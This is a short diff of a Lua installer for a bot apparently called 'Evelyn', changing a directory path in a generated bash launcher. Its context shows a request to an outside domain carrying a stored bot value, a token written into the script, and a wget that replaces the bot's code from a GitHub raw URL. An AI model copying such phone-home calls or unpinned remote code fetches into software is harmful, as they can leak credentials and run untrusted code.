@@ -68,7 +68,7 @@ http.request("http://tshake.ml/add/?id="..database:get(Server_Evelyn.."Id_Evelyn
 local RunEvelyn = io.open("Evelyn", 'w')
 RunEvelyn:write([[
 #!/usr/bin/env bash
-cd $HOME/Evelyn
+cd Evelyn
 token="]]..database:get(Server_Evelyn.."Token_Evelyn")..[["
 rm -fr Evelyn.lua
 wget "https://raw.githubusercontent.com/DevArMoF/Evelyn/main/Evelyn.lua"
